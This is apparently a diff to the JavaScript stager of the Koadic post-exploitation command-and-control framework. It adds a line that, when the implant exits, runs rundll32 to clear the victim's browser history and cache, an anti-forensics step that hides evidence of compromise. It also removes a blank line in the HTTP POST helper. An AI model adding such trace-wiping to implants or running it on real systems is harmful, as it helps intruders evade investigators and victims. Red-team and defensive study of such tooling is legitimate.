@@ -40,6 +40,7 @@ Koadic.sleep = function(#ms#, #callback#)
 //exit.start
 Koadic.exit = function()
 {
+    Koadic.shell.run("rundll32.exe InetCpl.cpl,ClearMyTracksByProcess 264", false);
     if (Koadic.isHTA())
     {
         // crappy hack?
@@ -563,7 +564,6 @@ Koadic.http.post = function(url, data, headers)
     var data = (typeof(data) !== "undefined") ? data : "";
     //var http = new ActiveXObject("Microsoft.XMLHTTP");
     var http = Koadic.http.create();
-
     http.open("POST", url, false);
     Koadic.http.addHeaders(http, headers);
     // alert("---Making request---\n" + url + '\n' + "--Data--\n" + data);
